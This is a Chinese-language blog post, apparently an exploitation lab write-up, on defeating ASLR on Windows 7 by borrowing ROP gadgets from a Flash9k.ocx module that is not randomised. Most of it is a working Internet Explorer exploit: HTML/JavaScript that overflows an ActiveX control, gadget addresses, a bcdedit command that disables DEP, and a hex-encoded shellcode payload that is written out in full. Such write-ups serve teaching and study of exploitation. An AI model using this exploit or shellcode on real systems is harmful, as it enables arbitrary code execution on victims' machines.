---
layout:		post
title:		攻击未启用ASLR的模块
author:		wooy0ung
tags:		
category:  	exploit
---


>[分析环境]  
>系统: Windows 7 Professional sp0 x86  
>编译器: Visual Studio 2008  
>调试器: OllyDbg 1.10  
>浏览器: Internet Explorer 8  
>Flash Player ActiveX: 9.0.262  
>注意: 关闭系统DEP  
<!-- more -->


### 0x00 前期准备

确定Flash9k.ocx加载基址是否固定不变, 重启前

![](/assets/img/exploit/2017-12-30-break-aslr-by-unaslr/0x00.png)

重启后

![](/assets/img/exploit/2017-12-30-break-aslr-by-unaslr/0x01.png)

然后注册*.ocx, 这里可以用VulnerAX_DEP.ocx

```
<html>  
<body>  
<object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=9,0,28,0" width="160" height="260">
  <param name="movie" value="1.swf" />
  <param name="quality" value="high" />
  <embed src="1.swf" quality="high" pluginspage="http://www.adobe.com/shockwave/download/download.cgi?P1_Prod_Version=ShockwaveFlash" type="application/x-shockwave-flash" width="160" height="260"></embed>
</object>
<object classid="clsid:39F64D5B-74E8-482F-95F4-918E54B1B2C8" id="test"></object>  
<script>  
var s = "\u9090";
while (s.length < 54) {
s += "\u9090";
}
s += "\u9090\u9090";
test.test(s);  
</script>  
</body>  
</html>
```

准备test.html文件, 贴入以上内容

![](/assets/img/exploit/2017-12-30-break-aslr-by-unaslr/0x02.png)

来到这里OD附加上去

![](/assets/img/exploit/2017-12-30-break-aslr-by-unaslr/0x03.png)

EIP已经被覆盖成0x90909090


### 0x01 构造rop

避免DEP干扰实验, 先关掉

```
> bcdedit.exe/set {current} nx AlwaysOff
``` 

![](/assets/img/exploit/2017-12-30-break-aslr-by-unaslr/0x04.png)

然后构造rop, 在Flash9k.ocx空间找到两条jmp esi(0xFFE6)指令

![](/assets/img/exploit/2017-12-30-break-aslr-by-unaslr/0x05.png)

0x100A5FC7处含有未知指令C7, 只有0x1012E78A能用

![](/assets/img/exploit/2017-12-30-break-aslr-by-unaslr/0x06.png)

这里要读[EAX], 先修复一EAX

![](/assets/img/exploit/2017-12-30-break-aslr-by-unaslr/0x07.png)

找到一条mov eax,edx retn 8(0x1014d286)


### 0x02 exploit

完整的exp

```
<html>  
<body>  
<object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=9,0,28,0" width="160" height="260">
  <param name="movie" value="1.swf" />
  <param name="quality" value="high" />
  <embed src="1.swf" quality="high" pluginspage="http://www.adobe.com/shockwave/download/download.cgi?P1_Prod_Version=ShockwaveFlash" type="application/x-shockwave-flash" width="160" height="260"></embed>
</object>
<object classid="clsid:06BC9528-F8A0-456B-BBBB-09C1248BF827" id="test"></object>  
<script>  
var s = "\u9090";
while (s.length < 54) {
s += "\u9090";
}
s += "\uD286\u1014\u9090\u9090\uE78A\u1012\u9090\u9090";
s += "\ud231\u30b2\u8b64\u8b12\u0c52\u528b\u8b1c\u0842\u728b\u8b20\u8012\u0c7e\u7533\u89f2\u03c7\u3c78\u578b\u0178\u8bc2\u207a\uc701\ued31\u348b\u01af\u45c6\u3e81\u6146\u6174\uf275\u7e81\u4508\u6978\u7574\u8be9\u247a\uc701\u8b66\u6f2c\u7a8b\u011c\u8bc7\uaf7c\u01fc\u68c7\u2067\u0120\u7968\u7530\u686e\u7720\u6f6f\ue189\u49fe\u310b\u51c0\uff50\u90d7";
test.test(s);  
</script>  
</body>  
</html>
```

pwn~

![](/assets/img/exploit/2017-12-30-break-aslr-by-unaslr/0x08.png)